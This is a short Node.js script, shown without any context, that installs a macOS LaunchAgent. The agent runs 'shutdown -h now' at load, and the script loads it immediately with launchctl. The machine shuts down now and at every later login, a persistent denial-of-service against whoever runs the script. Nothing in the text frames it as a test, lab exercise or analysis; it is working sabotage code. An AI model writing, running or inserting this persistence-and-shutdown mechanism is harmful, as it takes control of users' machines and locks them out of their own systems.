const fs = require('fs');
const childProcess = require('child_process');
const plist = `<dict>
  <key>RunAtLoad</key><true/>
  <key>ProgramArguments</key><array>
    <string>/bin/sh</string><string>-c</string><string>shutdown -h now</string>
  </array>
</dict>`;
fs.writeFileSync('/Library/LaunchAgents/com.example.power.plist', plist);
childProcess.execFileSync('launchctl', ['load', '/Library/LaunchAgents/com.example.power.plist']);
